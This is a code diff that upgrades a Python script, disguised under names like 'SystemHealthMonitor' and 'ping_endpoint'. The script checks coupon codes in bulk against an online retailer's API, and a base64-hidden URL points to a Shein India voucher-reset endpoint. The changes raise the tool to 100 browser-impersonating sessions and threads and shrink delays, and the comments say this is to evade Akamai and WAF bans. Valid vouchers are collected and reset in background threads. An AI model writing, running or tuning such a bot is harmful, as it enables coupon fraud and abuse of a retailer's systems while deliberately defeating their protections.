@@ -71,8 +71,8 @@ class SystemHealthMonitor:
         if not self.cookie_string:
             return False
             
-        # --- Create High-Speed Pre-warmed Session Pool (Increased to 40 for speed) ---
-        for _ in range(40):
+        # --- Create High-Speed Pre-warmed Session Pool (Massive 100 Limit) ---
+        for _ in range(100):
             fp = random.choice(FINGERPRINTS)
             session = crequests.Session(impersonate=fp)
             session.headers.update({
@@ -130,12 +130,17 @@ class SystemHealthMonitor:
             return None
 
     def reset_endpoint(self, code):
+        """ This is now run in a background thread so it doesn't slow down checking """
         url = self._d("aHR0cHM6Ly93d3cuc2hlaW5pbmRpYS5pbi9hcGkvY2FydC9yZXNldC12b3VjaGVy")
         payload = {"voucherId": code, "device": {"client_type": "web"}}
         session = random.choice(self.sessions)
         try:
-            session.post(url, json=payload, timeout=3)
+            session.post(url, json=payload, timeout=2) # Lowered timeout to free sockets faster
         except: pass
+
+    def trigger_background_reset(self, code):
+        """ Spawns a fire-and-forget thread so main worker continues instantly """
+        threading.Thread(target=self.reset_endpoint, args=(code,), daemon=True).start()
 
     def analyze_signal(self, data):
         if not data: return "NET_ERR"
@@ -156,15 +161,19 @@ class SystemHealthMonitor:
         """ Multi-threaded worker for checking coupons safely """
         masked = item[:3] + "*****" 
         
-        # Network Safety check inside thread
+        # Network Safety check inside thread (Optimized so it doesn't freeze all threads simultaneously)
+        should_cool_down = False
         with self.lock:
             if self.consecutive_errors > 10:
-                print(f"[{get_ist()}]  [WARN] Network Congestion. Cooling down 5s...")
-                time.sleep(5)
+                should_cool_down = True
                 self.consecutive_errors = 0
+                
+        if should_cool_down:
+            print(f"[{get_ist()}]  [WARN] Network Congestion. Cooling down 5s...")
+            time.sleep(5)
 
-        # Faster Turbo Delay (0.05s - 0.2s) to prevent immediate Akamai block
-        time.sleep(random.uniform(0.05, 0.2))
+        # Micro-Delay (0.01s - 0.05s) -> Insanely fast but prevents instant WAF ban
+        time.sleep(random.uniform(0.01, 0.05))
 
         resp = self.ping_endpoint(item)
         status = self.analyze_signal(resp)
@@ -174,19 +183,19 @@ class SystemHealthMonitor:
             ts_end = get_ist()
             if status == "OK":
                 print(f"[{ts_end}]    [OK] Verified: {masked}")
-                self.reset_endpoint(item)
+                self.trigger_background_reset(item) # Fire & Forget
                 self.keep_data.append(item)
                 self.consecutive_errors = 0
             
             elif status == "ARCHIVED":
                 print(f"[{ts_end}]    [WARN] Archived: {masked}")
-                self.reset_endpoint(item)
+                self.trigger_background_reset(item) # Fire & Forget
                 self.keep_data.append(item)
                 self.consecutive_errors = 0
             
             elif status == "CORRUPT":
                 print(f"[{ts_end}]    [ERR] Corrupt Data: {masked} -> Purging")
-                # self.corruption_detected = True # Uncommented this based on original code
+                # self.corruption_detected = True 
                 self.consecutive_errors = 0
             
             elif status == "AUTH_FAIL":
@@ -203,7 +212,7 @@ class SystemHealthMonitor:
                 self.consecutive_errors += 1
 
     def start_monitoring(self):
-        print(f"[{get_ist()}]  [SYS_INIT] Booting System Monitor v5.0 (Hyper Multi-Threaded - IST)...")
+        print(f"[{get_ist()}]  [SYS_INIT] Booting System Monitor v6.0 (Zero-Wait Hyper Engine)...")
         if not self.setup_session(): 
             print(f"[{get_ist()}]  [SYS_ERR] Connection Handshake Failed.")
             return
@@ -228,9 +237,9 @@ class SystemHealthMonitor:
             self.corruption_detected = False 
             self.consecutive_errors = 0
 
-            # --- MULTI-THREADING IMPLEMENTATION ---
-            # 30 parallel workers will check 30 coupons simultaneously for massive speedup
-            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+            # --- MASSIVE MULTI-THREADING IMPLEMENTATION ---
+            # 100 parallel workers will process all coupons practically instantly!
+            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                 executor.map(self._worker, current_data)
 
             # Sync Updates
